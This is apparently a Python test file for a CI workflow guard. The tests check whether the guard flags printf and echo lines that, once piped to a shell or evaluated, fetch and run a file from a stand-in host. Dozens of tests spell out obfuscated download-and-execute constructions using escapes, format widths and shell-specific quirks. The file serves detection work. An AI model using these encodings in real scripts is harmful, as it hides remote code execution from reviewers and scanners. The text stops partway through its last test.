"""#2955: a printed line is read as the shell that reads it gets it.

A printer the guard cannot spell out -- a `$` in a word, a `printf` format `printed` does not read, an `echo`
option or escape two shells read two ways -- has its words weighed as ONE text, and that text begins with the
printer's first word. `echo`'s is the line, so `echo "$X; curl … | sh" | sh` was reported. A `printf`'s is its
FORMAT and an `echo -n`'s is `-n`, so the line after it read as an argument and never as a command:
`printf '%s %s\\n' curl '-fsSLo t URL' | sh` read CLEAN under every `shell:` setting while every parent shell
runs the download. So did `eval "$(echo LINE)"`: a program word that is one `$(...)` was reported with a reason
the guard may drop, its printer's words never weighed.

The second walk now weighs, beside that one text, what the printer WRITES with each word as written
(`workflow_printers._apart`): a `printf`'s format with its words in place -- joined, cut, padded, decoded -- and
an `echo`'s line without its options, its escapes decoded where its shell decodes them. Each shell family is read
on its own (`_WRITERS`: bash 5.2, bash 3.2, bash 3.2 as macOS ships it, dash), since a quote one of them decodes
hides the command after it from that one alone. And the words of the one printer a program word's `$(...)` is are
weighed too (`worded`). The main pass reads as `main` does, so the job reports wherever either reading does.

Marks are a letter a `shell:` setting -- unset, `bash`, `sh`, `bash {0}`, `sh {0}` -- R where the guard reports:
first the job's, then the main pass's. Truth, in the comments, is what eight parent shells do in two passes on the
forge (bash 5.2.21 and 3.2.57 under `-e` and `-eo pipefail`, dash 0.5.12 under `-e`, then each without `-e`):
"runs" is the download ran under all sixteen, "under bash" under the twelve bash ones (the unset, `bash` and
`bash {0}` settings), "under dash" under the four dash ones (`sh`, `sh {0}`), "fetch only" none ran it, "nothing"
none fetched.

Named limits. A line that only FETCHES reports, as `echo curl | sh` does on `main` (`TestThePrice`): the word
`${X:+…}./t.sh` printed once with its name set, and a `curl` on a line of its own. A printer inside `$(...)` or
`<(...)` is read by every family, as `main` reads one there, so a line only dash makes reports under the bash
settings too. A line the guard can SPELL -- the `$` escaped inside double quotes -- is a program string, and two
copies of it are #2953's. A line whose command word is a one-word default (`${X:-curl} …`) waits for #2963's
rule. `builtin` in front of a printer is no wrapper to the reader, so the printer is not read at all (as on
`main`, spelled or not). Two gaps of the rendering, pinned as they read: a number written in another base prints
as `0` here, and `strftime` codes inside bash's `%(…)T` stand as written.

Everything here is measured on 766 rows in five bounded hunts; a class named below is the rows pinned for it.
"""
import unittest
from unittest import mock

import shell_reader
import workflow_guard as wg
import workflow_options as wo
import workflow_printers as wp

SHELLS = (None, "bash", "sh", "bash {0}", "sh {0}")
U = "https://example.test/t"
B, N = chr(92), chr(92) + "n"
L = "curl -fsSLo t " + U                # the fetch; `sh t` on the next line of the step runs the file
NOW = ("RRRRR", "CCCCC")                # the job reports; the main pass reads it CLEAN, as `main` did
BASH = ("RRCRC", "CCCCC")               # ... under the bash settings alone
DASH = ("CCRCR", "CCCCC")               # ... under the dash settings alone
BEFORE = ("RRRRR", "RRRRR")             # `main` reported it already
CLEAN = ("CCCCC", "CCCCC")
# A two-halved word: where X is set it fetches the file, where X is not it leaves the file's run.
WORD = "${X:+curl -fsSLo t.sh %s.sh#}./t.sh" % U
SET = "printf '' > t.sh\nchmod +x t.sh\nX=1\nexport X\n"
PRINTERS = {
    "printf '%s\\n'": "printf '%s\\n' {q}",
    "printf '%s'": "printf '%s' {q}",
    'printf "%s\\n"': 'printf "%s\\n" {q}',
    "printf '%b\\n'": "printf '%b\\n' {q}",
    "printf -- '%s\\n'": "printf -- '%s\\n' {q}",
    "printf, a second argument": "printf '%s\\n' 'true' {q}",
    "printf, after text in the format": "printf 'true\\n%s\\n' {q}",
    "printf, the line as the format": "printf {q}",
    "echo": "echo {q}",
    "echo -n": "echo -n {q}",
    "echo -E": "echo -E {q}",
    "echo, a second word": "echo 'true;' {q}",
}
ROUTES = {
    "| bash": "{p} | bash", "| dash": "{p} | dash", "| sh -s": "{p} | sh -s", "| bash -s --": "{p} | bash -s --",
    "| sudo sh": "{p} | sudo sh", "| env sh": "{p} | env sh", "| cat | sh": "{p} | cat | sh",
    "| tee f.txt | sh": "{p} | tee f.txt | sh",
    'eval "$(…)"': 'eval "$({p})"', "eval $(…)": "eval $({p})",
    'sh -c "$(…)"': 'sh -c "$({p})"', 'bash -c "$(…)"': 'bash -c "$({p})"',
    "sh <(…)": "sh <({p})",                                 # dash refuses `<(…)`: under bash
    "source <(…)": "source <({p})",                         # and bash 3.2 sources nothing from one: under bash 5.2
}
# What `main` reported already: its one text is the line where `echo` prints it down a pipe, or to a file.
MAINS = {"printf, the line as the format", "echo", "echo, a second word"}
MAINS_ECHO_ROUTES = {"| bash", "| dash", "| sh -s", "| bash -s --", "| sudo sh", "| env sh", "| cat | sh",
                     "| tee f.txt | sh", "sh <(…)", "source <(…)"}
THROUGH = {"pipe": "{p} | sh", "eval": 'eval "$({p})"', "sh -c": 'sh -c "$({p})"', "file": "sh <({p})"}


def marks(text):
    """(the job's marks, the main pass's) for a job of one step whose `run:` is `text`, both from the ONE
    `job_defects` run a setting: its first `_job_defects` pass is the main pass."""
    real, job, mains = wg._job_defects, "", ""
    for shell in SHELLS:
        seen = []

        def each(*args, **kwargs):
            seen.append(real(*args, **kwargs))
            return seen[-1]
        with mock.patch.object(wg, "_job_defects", each):
            job += "R" if wg.job_defects([wg.Step("step", text + "\necho done", shell)]) else "C"
        mains += "R" if seen[0] else "C"
    return job, mains


def fed(printer, route="pipe"):
    """`printer` handed to a shell down `route`, then the file `t` run."""
    return THROUGH[route].format(p=printer) + "\nsh t"


def single(printer, route="{p} | sh", quoted="'%s'" % WORD):
    """The word printed once, its name set: it only fetches."""
    return SET + route.format(p=printer.format(q=quoted))


def pair(printer, route="{p} | sh", quoted="'%s'" % WORD):
    """The word printed twice, its name set for the first copy and unset for the second: fetched, then run."""
    one = route.format(p=printer.format(q=quoted))
    return SET + one + "\nunset X\n" + one


class TestThePairReports(unittest.TestCase):
    """The issue's PF-w-pair and EVS-pair through the first hunt's 12 printers, 14 routes and 4 quotings: 46 rows,
    each run by a parent."""

    def test_through_the_twelve_printers(self):                   # truth: runs; `echo -E` under bash, dash prints the `-E`
        for name, printer in PRINTERS.items():
            with self.subTest(printer=name):
                self.assertEqual(BEFORE if name in MAINS else BASH if name == "echo -E" else NOW, marks(pair(printer)))

    def test_through_the_fourteen_routes(self):                     # truth: runs
        for name, route in ROUTES.items():
            with self.subTest(route=name, printer="printf"):
                self.assertEqual(NOW, marks(pair(PRINTERS["printf '%s\\n'"], route)))
            with self.subTest(route=name, printer="echo"):
                self.assertEqual(BEFORE if name in MAINS_ECHO_ROUTES else NOW, marks(pair(PRINTERS["echo"], route)))

    def test_however_the_line_is_quoted(self):
        bare = WORD.replace("$", "\\$").replace(" ", "\\ ").replace("#", "\\#")
        for printer, was in ((PRINTERS["printf '%s\\n'"], NOW), (PRINTERS["echo"], BEFORE)):
            with self.subTest(quoted="each character escaped", printer=printer[:6]):       # runs
                self.assertEqual(was, marks(pair(printer, quoted=bare)))
            with self.subTest(quoted="$'…'", printer=printer[:6]):                          # under bash
                self.assertEqual(was, marks(pair(printer, quoted="$'%s'" % WORD)))

    def test_a_line_the_guard_can_spell_is_a_program_string_and_two_copies_are_2953s(self):
        # The `$` escaped inside double quotes: `printed` spells the line, so it is read as a `-c` string is. Two
        # identical strings at two places are one word to the reader (#2953), and the pair reads CLEAN: runs.
        spelled = '"%s"' % WORD.replace("$", "\\$")
        for printer in (PRINTERS["printf '%s\\n'"], PRINTERS["echo"]):
            with self.subTest(printer=printer[:6]):
                self.assertEqual(CLEAN, marks(pair(printer, quoted=spelled)))


class TestALineTheFormatPutsTogether(unittest.TestCase):
    """27 printers whose FORMAT puts the line together. 25 hold no `$` at all: the format alone made them
    unspelled. `main` read the first table's 24 CLEAN down a pipe, and reported the second's three there."""

    JOINED = {                                              # truth: runs, each of them
        "two words, one line": "printf '%s %s" + N + "' curl '-fsSLo t " + U + "'",
        "four words": "printf '%s %s %s %s" + N + "' curl -fsSLo t " + U,
        "the command word in two halves": "printf '%s%s" + N + "' cur 'l -fsSLo t " + U + "'",
        "the format used again a word": "printf '%s ' curl -fsSLo t " + U,
        "after `--`": "printf -- '%s %s" + N + "' curl '-fsSLo t " + U + "'",
        "a `$` in a word": "printf '%s %s" + N + "' curl \"-fsSLo t " + U + "$Q\"",
        "the command in the format": "printf 'c%s -fsSLo t " + U + N + "' url",
        "a conversion past the words": "printf '%s" + L + N + "'",
        "after `%%`": "printf '%%s" + N + "%s" + N + "' '" + L + "'",
        "after a line of the format": "printf 'true" + N + "curl -fsSLo t %s" + N + "' " + U,
        "an octal escape in the format": "printf '" + B + "143url -fsSLo t %s" + N + "' " + U,
        "two `%b` words": "printf '%b' '" + L + N + "' 'true" + N + "'",
        "a `%b` word that decodes to two lines": "printf '%b" + N + "' \"true" + N + L + "$Q\"",
        "an octal escape in a `%b` word": "printf '%b" + N + "' '" + B + "143url -fsSLo t " + U + "'",
        "`\\c` ending a `%b` word": "printf '%b' '" + L + N + B + "c' 'echo \"open'",
        "a precision past the word": "printf '%.99s" + N + "' '" + L + "'",
        "a precision that cuts a word to the command": "printf '%.4s -fsSLo t %s" + N + "' curling " + U,
        "a width that pads the command's space": "printf '%-5s-fsSLo t %s" + N + "' curl " + U,
        "a width that pads on the left": "printf 'curl%13s t %s" + N + "' -fsSLo " + U,
        "a precision and a width": "printf '%-5.4s-fsSLo t %s" + N + "' curling " + U,
        "four `%c`": "printf '%c%c%c%c -fsSLo t %s" + N + "' cat uname rm ls " + U,
        "`/usr/bin/printf`": "/usr/bin/printf '%s %s" + N + "' curl '-fsSLo t " + U + "'",
        "`command printf`": "command printf '%s %s" + N + "' curl '-fsSLo t " + U + "'",
        "`env printf`": "env printf '%s %s" + N + "' curl '-fsSLo t " + U + "'",
    }
    MAINS_READ = {                                          # `main`'s one text happens to begin with the fetch
        "the fetch in the format": "printf 'curl %s %s %s" + N + "' -fsSLo t " + U,          # runs
        "a `*` width": "printf '%*s" + N + "' 1 '" + L + "'",                                # runs
        "a `%n` after the line": "printf 'curl -fsSLo t %s%n" + N + "' " + U + " v",         # runs
    }

    def test_down_a_pipe(self):
        for name, printer in self.JOINED.items():
            with self.subTest(printer=name):
                self.assertEqual(NOW, marks(fed(printer)))
        for name, printer in self.MAINS_READ.items():
            with self.subTest(printer=name):
                self.assertEqual(BEFORE, marks(fed(printer)))

    def test_through_a_substitution_where_main_weighed_no_printer_at_all(self):
        for name in ("two words, one line", "the command word in two halves", "the command in the format"):
            for route in ("eval", "sh -c", "file"):          # truth: runs; the file route under bash
                with self.subTest(printer=name, route=route):
                    self.assertEqual(NOW, marks(fed(self.JOINED[name], route)))
        for name in ("a width that pads the command's space", "a precision that cuts a word to the command", "four `%c`"):
            with self.subTest(printer=name, route="eval"):   # truth: runs
                self.assertEqual(NOW, marks(fed(self.JOINED[name], "eval")))
        for name, printer in self.MAINS_READ.items():        # ... nor these, down a pipe its one text's
            with self.subTest(printer=name):
                self.assertEqual(NOW, marks(fed(printer, "eval")))

    def test_the_format_in_a_variable_has_each_word_weighed(self):
        step = "F='%s" + N + "'\n" + "{}\nsh t"             # truth: runs
        self.assertEqual(BEFORE, marks(step.format("printf \"$F\" '" + L + "' | sh")))
        self.assertEqual(NOW, marks(step.format("eval \"$(printf \"$F\" '" + L + "')\"")))


class TestOneShellsOwnReading(unittest.TestCase):
    """What only one family of shells prints as a line: read under the settings that family is, and no other."""

    def test_fourteen_lines_only_bash_prints(self):         # truth: under bash, each
        for name, printer in (
                ("`\\x` in a format", "printf '" + B + "x63url -fsSLo t %s" + N + "' " + U),
                ("`%q`", "printf '%q ' curl -fsSLo t " + U),
                ("`%Q`, bash 5.2's", "printf '%Q ' curl -fsSLo t " + U),                    # under bash 5.2
                ("`%(text)T`, bash 5.2's", "printf '%(" + L + ")T" + N + "' 0"),            # under bash 5.2
                ("a length letter", "printf '%ls %ls" + N + "' curl '-fsSLo t " + U + "'"),
                ("`\\u`, bash 5.2's", "printf '" + B + "u0063url -fsSLo t %s" + N + "' " + U),   # under bash 5.2
                ("a `\\\"` that closes a quote", "printf '\"true " + B + "\"; " + L + " #\"" + N + "'"),
                ("a `\\u0022` bash 3.2 leaves", "printf '" + B + "u0022; " + B + "x63url -fsSLo t " + U + " #"
                 + B + "u0022" + N + "'"),                                                  # under bash 3.2
                ("echo -ne", 'echo -ne "' + L + "$Q" + N + '"'),
                ("echo -e, an octal escape", 'echo -e "' + B + "0143url -fsSLo t " + U + '$Q"'),
                ("echo -e, `\\x`", 'echo -e "' + B + "x63url -fsSLo t " + U + '$Q"'),
                ("echo -e, `\\c`", 'echo -e "' + L + "$Q" + B + 'c" junk'),
                ("echo -e, tabs", 'echo -e "curl' + B + "t-fsSLo" + B + "tt" + B + "t" + U + '$Q"'),
                ("echo -e, `\\c` before an open quote", 'echo -e "' + L + "$Q" + N + B + "c\" 'echo \"open'")):
            with self.subTest(printer=name):
                self.assertEqual(BASH, marks(fed(printer)))

    def test_the_readings_are_not_nested(self):
        # One text a family, never "whatever any shell decodes": a quote one family decodes hides the command
        # from that family and bares it to the other. Each row has a conversion in front of the line, so `main`'s
        # one text does not begin with it.
        for name, printer, written in (
                # bash decodes `\"`: the quote closes and the fetch stands bare. dash keeps it open.  Under bash.
                ("bash alone bares it", "printf '\"%s " + B + "\"; %s #\"" + N + "' true '" + L + "'", BASH),
                # dash keeps `\"` two characters: no quote, so the fetch is a command. bash quotes it.  Under dash.
                ("dash alone bares it", "printf '%s " + B + "\"a; %s; echo b" + B + "\"" + N + "' echo '" + L + "'", DASH),
                # bash 5.2 decodes `\u0022` into a quote; bash 3.2 and dash keep it.  Under bash 3.2 and dash.
                ("bash 5.2 alone hides it", "printf '" + B + "u0022; %s #" + B + "u0022" + N + "' '" + L + "'", NOW)):
            with self.subTest(row=name):
                self.assertEqual(written, marks(fed(printer)))

    def test_three_lines_only_dash_prints(self):            # truth: under dash, each
        for name, printer in (
                ("echo, `\\n` with no option", 'echo "true' + N + L + '$Q"'),
                ("echo -E, which dash prints", 'echo -E "true' + N + L + '$Q"'),
                ("echo, an octal escape with no `0`", 'echo "' + B + "143url -fsSLo t " + U + '$Q"')):
            with self.subTest(printer=name):
                self.assertEqual(DASH, marks(fed(printer)))
        # A spelled twin `main` reads the same way, setting by setting.
        self.assertEqual(("CCRCR", "CCRCR"), marks(fed("echo 'true" + N + L + "'")))

    def test_three_lines_both_print(self):                  # truth: runs, each
        for name, printer in (
                ("echo -e, `\\n`", 'echo -e "true' + N + L + '$Q"'),
                ("echo -en", 'echo -en "true' + N + L + "$Q" + N + '"'),
                ("echo -e -n", 'echo -e -n "true' + N + L + "$Q" + N + '"')):
            with self.subTest(printer=name):
                self.assertEqual(NOW, marks(fed(printer)))
        self.assertEqual(BEFORE, marks(fed("echo -e 'true" + N + L + "'")))                  # spelled: `main`'s

    def test_sixteen_printers_that_print_no_line_stay_clean(self):  # truth: nothing, each
        for name, printer in (
                ("`%d`", "printf '%d" + N + "' '" + L + "'"),
                ("`%c`", "printf '%c" + N + "' '" + L + "'"),
                ("a precision that cuts the command", "printf '%.3s" + N + "' '" + L + "'"),
                ("`%.s`", "printf '%.s -fsSLo t %s" + N + "' curl " + U),
                ("three `%c`", "printf '%c%c%c -fsSLo t %s" + N + "' cat uname rm " + U),
                ("no width, no space", "printf '%s-fsSLo t %s" + N + "' curl " + U),
                ("a width the word fills", "printf '%-4s-fsSLo t %s" + N + "' curl " + U),
                ("the line after a word of the format", "printf 'true %s" + N + "' '" + L + "'"),
                ("the line in a comment", "printf '# %s" + N + "' '" + L + "'"),
                ("the line in quotes", "printf \"'%s'" + N + "\" '" + L + "'"),
                ("the line an `echo`'s", "printf 'echo %s" + N + "' '" + L + "'"),
                ("`-v NAME`", "printf -v out '%s" + N + "' '" + L + "'"),
                ("a letter no shell knows, first", "printf '%y" + N + "curl -fsSLo t %s" + N + "' x " + U),
                ("echo, the line a second word", 'echo true "' + L + '$Q"'),
                ("echo -e, the line a second word", 'echo -e "true ' + L + '$Q"'),
                ("echo -e, an octal escape with no `0`", 'echo -e "' + B + "143url -fsSLo t " + U + '$Q"')):
            for route in ("pipe", "eval"):
                with self.subTest(printer=name, route=route):
                    self.assertEqual(CLEAN, marks(fed(printer, route)))

    def test_a_percent_that_begins_no_conversion_ends_the_output(self):
        after, before = "printf '" + L + N + "%'", "printf '%" + N + L + N + "'"
        self.assertEqual(BEFORE, marks(fed(after)))                      # truth: runs; the line is printed first
        self.assertEqual(NOW, marks(fed(after, "eval")))                 # runs
        for route in ("pipe", "eval"):                                   # truth: nothing; no shell prints the line
            with self.subTest(route=route):
                self.assertEqual(CLEAN, marks(fed(before, route)))
                self.assertEqual(CLEAN, marks(fed("printf '%" + N + "%s" + N + "' '" + L + "'", route)))

    def test_the_two_gaps_of_the_rendering_as_they_read(self):
        # A number written in another base: the shells print 16 for `0x10`, the rendering `0`. The fetch is
        # read all the same, into a file named otherwise.  Truth: runs.
        number = "printf 'curl -fsSLo t%d %s" + N + "sh t16" + N + "' 0x10 " + U
        self.assertEqual(BEFORE, marks(fed(number)))
        self.assertEqual(NOW, marks(fed(number, "eval")))
        # `strftime` codes inside bash 5.2's `%(…)T` stand as written: `%%` is not made `%`, `%Y` not a year.
        for inner in (L + " %%", L + "#%Y"):                             # truth: under bash 5.2
            with self.subTest(inner=inner[-3:]):
                self.assertEqual(BASH, marks(fed("printf '%(" + inner + ")T" + N + "' 0")))

    def test_a_bare_variable_or_a_harmless_default_through_the_twelve_printers(self):
        for line in ("$X -fsSLo t " + U, "${X:-echo} -fsSLo t " + U):                       # truth: nothing
            for name, printer in PRINTERS.items():
                with self.subTest(line=line[:10], printer=name):
                    self.assertEqual(CLEAN, marks(printer.format(q="'%s'" % line) + " | sh\nsh t"))


class TestThePrice(unittest.TestCase):
    """What reports though no parent runs a download: a line that only FETCHES, as on `main`, and a line only
    dash makes, on a route every family is read for."""

    def test_the_single_through_the_twelve_printers(self):        # truth: fetch only
        for name, printer in PRINTERS.items():
            with self.subTest(printer=name):
                self.assertEqual(BEFORE if name in MAINS else BASH if name == "echo -E" else NOW,
                                 marks(single(printer)))

    def test_the_single_a_guard_can_spell_stays_clean(self):
        spelled = '"%s"' % WORD.replace("$", "\\$")         # truth: fetch only
        for printer in (PRINTERS["printf '%s\\n'"], PRINTERS["echo"]):
            with self.subTest(printer=printer[:6]):
                self.assertEqual(CLEAN, marks(single(printer, quoted=spelled)))

    def test_a_fetcher_on_a_line_of_its_own_is_its_spelled_twin(self):
        self.assertEqual(BEFORE, marks("echo curl | sh\nsh t"))                              # `main`'s reading
        self.assertEqual(NOW, marks(fed("printf '%s" + N + "' curl -fsSLo t " + U)))        # truth: fetch only

    def test_four_rows_only_dash_makes_report_under_the_bash_settings_too(self):
        for printer, route in (('echo "true' + N + L + '$Q"', "file"),                      # truth: nothing, each:
                               ('echo -E "true' + N + L + '$Q"', "sh -c"),                  # dash refuses `<(…)`, and
                               ('echo -E "true' + N + L + '$Q"', "file"),                   # `sh -c` takes `-E …` for
                               ('echo "' + B + "143url -fsSLo t " + U + '$Q"', "file")):   # its options
            with self.subTest(printer=printer[:12], route=route):
                self.assertEqual(NOW, marks(fed(printer, route)))


class TestTheRowsThatWaitForAnotherRule(unittest.TestCase):
    """Rows a parent runs that this PR does not move, each pinned as it reads and named with what it waits for."""

    def test_a_printed_line_whose_command_word_is_a_default_waits_for_2963(self):
        line = "${X:-curl} -fsSLo t " + U
        for name, step in (("PF-fetch-run", "printf '%%s\\n' '%s' | sh\nsh t" % line),          # runs
                           ("its `echo` twin", "echo '%s' | sh\nsh t" % line),                   # runs
                           ("EVS-fetch-run", "eval \"$(echo '%s')\"\nsh t" % line)):             # runs
            with self.subTest(row=name):
                self.assertEqual(CLEAN, marks(step))
        self.assertEqual(BEFORE, marks("eval \"$(echo '%s')\"\nsh t" % L))                       # the command written out

    def test_builtin_in_front_of_a_printer_is_no_wrapper_to_the_reader(self):
        # Under bash: `builtin` runs the printer. The reader strips `command`, not `builtin`, so the stage is
        # no printer to this module, spelled (`echo 'LINE'`) or not; nothing here can read it.
        for printer in ("builtin echo '" + L + "'", "builtin printf '%s %s" + N + "' curl '-fsSLo t " + U + "'"):
            with self.subTest(printer=printer[:14]):
                self.assertEqual(CLEAN, marks(fed(printer)))
        self.assertEqual(BEFORE, marks(fed("command echo '" + L + "'")))


class TestWhatAPrinterWrites(unittest.TestCase):
    """`_formatted` and `_echoed` against what the shells themselves print for the same words (measured by handing
    the words to each builtin as arguments, `render_diff.py`: bash 5.2.21, bash 3.2.57, dash 0.5.12)."""

    def setUp(self):
        self.BASH5, self.BASH3, self.MACOS = wp._WRITERS["bash"]
        (self.DASH,) = wp._WRITERS["sh"]

    def test_a_format_all_three_print_alike(self):
        for fmt, words, written in (
                ("%s" + N, ["a b"], "a b\n"), ("%s %s" + N, ["a", "b c"], "a b c\n"), ("%s%s" + N, ["a", "b"], "ab\n"),
                ("%s ", ["a", "b", "c"], "a b c "), ("%s" + N, ["a", "b"], "a\nb\n"), ("x%sy", [], "xy"),
                ("%%s" + N + "%s", ["a"], "%s\na"), ("a" + N + "b %s" + N, ["c"], "a\nb c\n"),
                (B + "143x" + B + "0143 %s", ["a"], "cx\x0c3 a"), ("a" + B + "tb" + B + B + "c" + B + "qd", [], "a\tb\\c\\qd"),
                ("%b", ["a" + N, "b" + B + "0143"], "a\nbc"), ("%b" + N, [B + "143"], "c\n"), ("%s|%b|%s", ["a", "b" + B + "c", "d"], "a|b"),
                ("a" + B + "cb%s", ["d"], "a\\cbd"), ("%*s|%-*s|", ["3", "a", "3", "b"], "  a|b  |"), ("%*s|", ["-3", "a"], "a  |"),
                ("%.2s|%.0s|%.s|%.9s|", ["abcd"] * 4, "ab|||abcd|"), ("%.*s|%.*s|", ["2", "abcd", "x", "abcd"], "ab||"),
                ("%6.2s|%-6.2s|", ["abcd", "abcd"], "    ab|ab    |"), ("%c%c|%3c|", ["ab", "cd", "ef"], "ac|  e|"),
                ("%d|%i|%d|%5d|", ["12", "-3", "x", "7"], "12|-3|0|    7|"), ("%.2b|%4b|", ["a" + B + "tbc", "d"], "a\t|   d|"),
                ("a%yb%s", ["x", "y"], "a"), ("%s|%y|%s", ["a", "b", "c"], "a|"), ("plain", ["x", "y"], "plain"),
                ("a%", ["x"], "a"), ("%5%|", [], ""), ("a%" + N + "b%s", ["c"], "a"), ("a" + B + "045b", [], "a%b"),
                ("%d|%d|", ["", "0x10"], "0|0|"),                                # the gap: the shells print `0|16|`
                ("%s" + B + "0z", ["a"], "az")):
            for kinds in (self.BASH5, self.BASH3, self.MACOS, self.DASH):
                with self.subTest(fmt=fmt, words=words, letters=kinds["letters"]):
                    self.assertEqual(written, wp._formatted(fmt, words, kinds))

    def test_a_format_each_family_prints_its_own_way(self):
        for fmt, words, bash5, bash3, dash in (
                (B + "x63" + B + "e|", [], "c\x1b|", "c\x1b|", B + "x63\x1b|"),
                (B + "E|", [], "\x1b|", "\x1b|", B + "E|"),
                (B + "u0063|" + B + "U00000063|", [], "c|c|", B + "u0063|" + B + "U00000063|", B + "u0063|" + B + "U00000063|"),
                ("a" + B + '"b' + B + "'c" + B + "?d", [], "a\"b'c?d", "a\"b'c?d", "a" + B + '"b' + B + "'c" + B + "?d"),
                ("%b|", [B + "x63" + B + '"' + B + "u0063"], "c" + B + '"c|', "c" + B + '"' + B + "u0063|", B + "x63" + B + '"' + B + "u0063|"),
                ("%q|%q|%q|", ["a b", "", "a=b:c/d.e+f@g%h-i_j,k"], "a\\ b|''|a=b:c/d.e+f@g%h-i_j\\,k|",
                 "a\\ b|''|a=b:c/d.e+f@g%h-i_j\\,k|", ""),
                ("%Q|", ["a b"], "a\\ b|", "", ""), ("%(a b)T|", ["0"], "a b|", "", ""), ("a%nb", ["v"], "ab", "ab", "a"),
                ("%(%%Y)T|", ["0"], "%%Y|", "", ""),                             # the gap: bash 5.2 prints `%Y|`
                ("a%ls|%zd|", ["x", "1"], "ax|1|", "ax|1|", "a"),
                ("a" + B + "ud800b", [], "ab", "a" + B + "ud800b", "a" + B + "ud800b")):       # no text holds a lone surrogate
            for kinds, written in ((self.BASH5, bash5), (self.BASH3, bash3), (self.MACOS, bash3), (self.DASH, dash)):
                with self.subTest(fmt=fmt, words=words, letters=kinds["letters"], echo=kinds["echo"]):
                    self.assertEqual(written, wp._formatted(fmt, words, kinds))

    def test_an_echo_under_each_row_and_family(self):
        bash, dash = wp._ECHO["bash"], wp._ECHO["sh"]
        for words, bash5, bash3, macos, sh in (
                (["a", "b"], "a b", "a b", "a b", "a b"), (["-n", "a"], "a", "a", "a", "a"),
                (["-e", "a" + N + "b"], "a\nb", "a\nb", "a\nb", "-e a\nb"), (["a" + N + "b"], "a" + N + "b", "a" + N + "b", "a" + N + "b", "a\nb"),
                (["-E", "a" + N + "b"], "a" + N + "b", "a" + N + "b", "a" + N + "b", "-E a\nb"),
                (["-ne", "a" + N], "a\n", "a\n", "a\n", "-ne a\n"), (["-e", "-n", "a"], "a", "a", "a", "-e -n a"),
                (["-n", "-e", "a" + N], "a\n", "a\n", "a\n", "-e a\n"), (["-nn", "a"], "a", "a", "a", "-nn a"),
                (["-n", "-n", "a"], "a", "a", "a", "-n a"),                         # dash takes ONE `-n`
                (["-eE", "a" + N], "a" + N, "a" + N, "a" + N, "-eE a\n"), (["-Ee", "a" + N], "a\n", "a\n", "a\n", "-Ee a\n"),
                (["-e", B + "0143" + B + "143"], "c" + B + "143", "c" + B + "143", "c" + B + "143", "-e cc"),
                (["-e", B + "x63" + B + "e"], "c\x1b", "c\x1b", "c" + B + "e", "-e " + B + "x63\x1b"),
                (["-e", B + "u0063"], "c", B + "u0063", B + "u0063", "-e " + B + "u0063"),
                (["-e", "a" + B + "c", "b"], "a", "a", "a", "-e a"), (["-e", "a" + B + '"b'], "a" + B + '"b', "a" + B + '"b', "a" + B + '"b', "-e a" + B + '"b'),
                (["--", "a"], "-- a", "-- a", "-- a", "-- a"), (["-x", "a"], "-x a", "-x a", "-x a", "-x a"), ([], "", "", "", "")):
            for row, kinds, written in ((bash, self.BASH5, bash5), (bash, self.BASH3, bash3), (bash, self.MACOS, macos),
                                        (dash, self.DASH, sh)):
                with self.subTest(words=words, echo=kinds["echo"], letters=kinds["letters"]):
                    self.assertEqual(written, wp._echoed(words, row, kinds))


class TestTheSecondWalkAlone(unittest.TestCase):
    """Both readings are the second walk's: nothing of them answers while the main pass runs."""

    @staticmethod
    def argv(line):
        return shell_reader.command(shell_reader.statements(line)[0].stages[0].argv)

    def test_the_texts_a_printer_adds_by_the_shell_that_runs_it(self):
        for line, bash, sh, any_ in (
                ("printf '%s" + N + "' '$X y' z", ["$X y\nz\n"], ["$X y\nz\n"], ["$X y\nz\n"]),
                ("printf -- '%s" + N + "' '$X'", ["$X\n"], ["$X\n"], ["$X\n"]),
                ("/usr/bin/printf '%s" + N + "' '$X'", ["$X\n"], ["$X\n"], ["$X\n"]),
                ("printf '$X'", [], [], []),                    # the format alone: `main`'s one text is this one
                ("printf '$X" + N + "'", ["$X\n"], ["$X\n"], ["$X\n"]),
                ("printf -v out '%s' '$X'", [], [], []),        # an option in the format's place: nothing printed
                ("printf -- -v '$X'", ["-v"], ["-v"], ["-v"]),  # after `--` it IS the format
                ('printf "$F" "$X y" z', ["$F", "$X y", "z"], ["$F", "$X y", "z"], ["$F", "$X y", "z"]),   # a `$` format
                ("printf '" + B + "x63%s' '$X'", ["c$X"], [B + "x63$X"], ["c$X", B + "x63$X"]),
                ("printf '" + B + "u0063%s' '$X'", ["c$X", B + "u0063$X"], [B + "u0063$X"], ["c$X", B + "u0063$X"]),
                ("printf", [], [], []),
                ("echo '$X' y", [], [], []),                    # `echo`'s one text is its line
                ("echo -n '$X' y", ["$X y"], ["$X y"], ["$X y"]),
                ("echo -ne -E '$X'", ["$X"], [], ["$X"]),      # dash takes ONE `-n`: its text is `main`'s
                ("echo -n -e '$X'", ["$X"], ["-e $X"], ["$X", "-e $X"]),
                ("echo -n -n '$X'", ["$X"], ["-n $X"], ["$X", "-n $X"]),
                ("echo -e '$X" + N + "y'", ["$X\ny"], ["-e $X\ny"], ["$X\ny", "-e $X\ny"]),
                ("echo '$X" + N + "y'", [], ["$X\ny"], ["$X\ny"]),
                ("echo -e '$X" + B + "e'", ["$X\x1b", "$X" + B + "e"], ["-e $X\x1b"], ["$X\x1b", "$X" + B + "e", "-e $X\x1b"]),
                ("echo", [], [], [])):
            words = self.argv(line)
            with self.subTest(line=line):
                self.assertEqual((bash, bash, sh, sh, any_, any_),
                                 (wp._apart(words, None), wp._apart(words, "bash {0}"), wp._apart(words, "sh"),
                                  wp._apart(words, "dash"), wp._apart(words), wp._apart(words, "ksh")))
            with self.subTest(line=line, main_pass=True), wo.mains_answer():
                self.assertEqual([], wp._apart(words, None) + wp._apart(words))

    def test_a_printer_is_weighed_once_a_DISTINCT_text(self):
        def texts(script, shell):
            stages = shell_reader.statements(script)[0].stages
            return wp.unspelled(stages[-1], stages[:-1], shell)[1:]

        # Every family's text differs here: bash 5.2 decodes `\u`, `\x` and `\e`, bash 3.2 not `\u`, macOS's 3.2
        # not `\e` either; dash prints the `-e` and decodes `\e` alone. `main`'s one text, then one a family.
        differ = 'echo -e "' + B + "u0063" + B + "x75rl" + B + 'e $U" | sh'
        self.assertEqual(4, len(texts(differ, None)))               # a bash setting: three families
        self.assertEqual(2, len(texts(differ, "sh")))               # a dash setting: one
        self.assertEqual(5, len(texts(differ, wp.ANY)))             # an unmeasured runner: all four
        # Where the families print alike, their one text is weighed once beside `main`'s.
        alike = "printf '%s %s" + N + "' a \"$U\" | sh"
        self.assertEqual([2, 2, 2], [len(texts(alike, shell)) for shell in (None, "sh", wp.ANY)])
        with wo.mains_answer():                                     # the main pass: `main`'s one text alone
